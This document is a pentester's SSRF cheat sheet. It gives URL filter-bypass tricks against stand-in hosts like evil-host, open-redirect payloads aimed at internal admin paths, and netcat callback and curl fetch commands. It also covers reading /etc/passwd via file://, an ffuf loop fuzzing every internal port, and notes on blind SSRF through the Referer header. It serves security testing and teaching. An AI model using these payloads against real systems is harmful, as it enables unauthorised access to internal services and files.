- Check Parts of HTTP requests, including URLs
- Check File imports such as HTML, PDFs, images, etc.
- Check Remote server connections to fetch data
- Check API specification imports
- Check Dashboards including ping and similar functionalities to check server statuses
- As time allows, try to provide APIs with input in various **formats/encodings**
	- `127.1`
	- `017700000001`
	- `double url encode` etc.
* You can embed credentials in a URL before the hostname, using the `@` character `https://expected-host:fakepassword@evil-host`
- You can use the `#` character to indicate a URL fragment `https://evil-host#expected-host`
- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control `https://expected-host.evil-host`

- Check for open redirects
```http
/product/nextProduct?currentProductId=6&path=http://evil-user.net

POST /product/stock 
stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

* Start Netcat and see if Server connects back to us
```sh
$ nc -nvlp 8080

listening on [any] 8080 ...
```

* Create a HTML page and cURL the target page to see if it fetches it
```html
<html>
</body>
<a>SSRF</a>
<body>
<html>
```

```sh
$ curl -i -s "http://<TARGET IP>/load?q=ftp://<Adapter-IP>/index.html"
```

* Curl the target page and see whats on there
```sh
# Without Redirect
$ curl -i -s http://<TARGET IP>

# With Redirect
$ curl -i -s -L http://<TARGET IP>
```

* Use `file:///etc/passwd` to read internal files

* When SSRF found try to fuzz internal ports
```sh
# Create port wordlist
$ for port in {1..65535};do echo $port >> ports.txt;done

# Fuzz internal ports
$ ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs 30
```

## Blind SSRF
* Arise when an application can be induced to issue a back-end HTTP request to a supplied URL, but the response from the back-end request is not returned in the application's front-end response
* Most reliable way to detect blind SSRF vulnerabilities is using out-of-band ([OAST](https://portswigger.net/burp/application-security-testing/oast)) techniques
* This involves attempting to trigger an HTTP request to an external system that you control, and monitoring for network interactions with that system
* Some applications employ server-side analytics software that tracks visitors. This software often logs the **Referer header** in requests, since this is of particular interest for tracking incoming links. Often the analytics software will actually visit any third-party URL that appears in the Referer header. This is typically done to analyze the contents of referring sites, including the anchor text that is used in the incoming links. As a result, the Referer header often represents fruitful attack surface for SSRF vulnerabilities